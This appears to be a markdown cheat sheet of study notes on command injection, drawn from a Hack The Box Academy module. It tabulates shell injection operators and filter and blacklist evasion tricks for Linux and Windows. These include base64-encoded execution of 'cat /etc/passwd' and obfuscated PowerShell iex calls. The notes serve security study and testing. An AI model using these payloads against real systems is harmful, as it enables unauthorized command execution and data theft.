# security/command-injection.md

## Injection operators (shell metacharacters)
Reference: https://academy.hackthebox.com/beta/module/109/section/1032#injection-operators

| Operator | Character | URL-encoded | Outcome |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Execute both commands |
| New line | `\n` | `%0a` | Execute both commands |
| Background | `&` | `%26` | Execute both (second output may appear first) |
| Pipe | `|` | `%7c` | Pipe output (often only second output shown) |
| AND | `&&` | `%26%26` | Execute second only if first succeeds |
| OR | `||` | `%7c%7c` | Execute second only if first fails |
| Sub-shell | ```` | `%60%60` | Execute in sub-shell (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Execute in sub-shell (Linux) |

## Linux filtered character bypass
Reference: https://academy.hackthebox.com/beta/module/109/section/1032#filtered-character-bypass

| Code | Outcome |
| --- | --- |
| `printenv` | List environment variables |
| `%09` | Tab in place of space |
| `${IFS}` | Space/tab expansion (not in `$()`) |
| `{ls,-la}` | Comma expands to space |
| `${PATH:0:1}` | Expands to `/` |
| `${LS_COLORS:10:1}` | Expands to `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |

## Linux blacklisted command bypass
Reference: https://academy.hackthebox.com/beta/module/109/section/1032#blacklisted-command-bypass

| Technique | Code | Outcome |
| --- | --- | --- |
| Character insertion | `'` or `"` | Total quote count must be even |
| Character insertion | `$@` or `\` | Linux-only |
| Case manipulation | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute regardless of case filters |
| Case manipulation | `$(a="WhOaMi";printf %s "${a,,}")` | Lowercase transform |
| Reversed command | `echo 'whoami' | rev` | Reverse a string |
| Reversed command | `$(rev<<<'imaohw')` | Execute reversed command |
| Base64 encode | `echo -n 'cat /etc/passwd | grep 33' | base64` | Encode payload |
| Base64 execute | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute decoded payload |

## Windows filtered character bypass
Reference: https://academy.hackthebox.com/beta/module/109/section/1032#filtered-character-bypass-1

| Code | Outcome |
| --- | --- |
| `Get-ChildItem Env:` | List environment variables (PowerShell) |
| `%09` | Tab in place of space |
| `%PROGRAMFILES:~10,-5%` | Expands to a space (CMD) |
| `$env:PROGRAMFILES[10]` | Expands to a space (PowerShell) |
| `%HOMEPATH:~0,-17%` | Expands to `\` (CMD) |
| `$env:HOMEPATH[0]` | Expands to `\` (PowerShell) |

## Windows blacklisted command bypass
Reference: https://academy.hackthebox.com/beta/module/109/section/1032#blacklisted-command-bypass-1

| Technique | Code | Outcome |
| --- | --- | --- |
| Character insertion | `'` or `"` | Total quote count must be even |
| Character insertion | `^` | Windows CMD escape |
| Case manipulation | `WhoAmi` | Mixed-case bypass |
| Reverse string | `"whoami"[-1..-20] -join ''` | Reverse a string (PowerShell) |
| Execute reversed | `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command (PowerShell) |
| Base64 encode | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode (PowerShell Unicode) |
| Base64 execute | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Decode + execute (PowerShell) |
